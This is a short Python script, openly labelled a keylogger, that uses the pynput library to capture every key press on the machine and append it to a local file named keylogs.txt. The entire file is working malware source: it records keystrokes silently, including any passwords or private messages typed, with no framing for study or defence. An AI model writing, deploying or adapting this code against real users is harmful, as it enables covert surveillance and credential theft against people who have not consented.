from pynput.keyboard import Listener
from datetime import datetime

def onpress(key):
    keylogs = []
    keyname = str(key)
    keyname = keyname.replace("'", "")

    if len(keyname) > 1:
        if keyname == "Key.space":
            keyname = " "
            keylogs.append(keyname)
        elif keyname == "Key.enter":
            keyname = "[ENTER]\n"
            keylogs.append(keyname)
        elif keyname == "Key.backspace":
            keyname = "[BACKSPACE]"
            keylogs.append(keyname)
        elif keyname == "Key.tab":
            keyname = "     "
            keylogs.append(keyname)
        else:
            pass

    else:
        keylogs.append(keyname)

    if True:
        logs = "".join(keylogs)
        savefile(logs)

def savefile(content):
    filename = 'keylogs.txt'
    with open(filename, "a") as file:
        file.write(content)

with Listener(on_press=onpress) as listener:
    print(f"[+]{datetime.now()} -started keylogger")
    listener.join()